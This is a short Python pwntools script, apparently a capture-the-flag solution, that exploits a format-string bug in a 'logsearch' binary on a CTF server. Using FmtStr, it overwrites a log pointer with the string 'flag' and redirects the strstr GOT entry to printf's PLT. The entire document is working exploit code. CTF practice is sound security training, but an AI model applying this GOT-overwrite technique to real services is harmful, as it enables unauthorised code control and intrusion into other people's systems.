from pwn import *

logAddress = 0x8049d7c
strstrGotAddress = 0x8049d38
printfPltAddress = 0x80485f0

def exec_fmt(payload):
	# p = process('./logsearch')
	p = remote('ctf.hackucf.org', 20008)
	p.sendline(payload)
	data = p.recvall()
	print data
	return data


autofmt = FmtStr(exec_fmt)
autofmt.write(logAddress, u32('flag'))
autofmt.write(strstrGotAddress, printfPltAddress)
autofmt.execute_writes()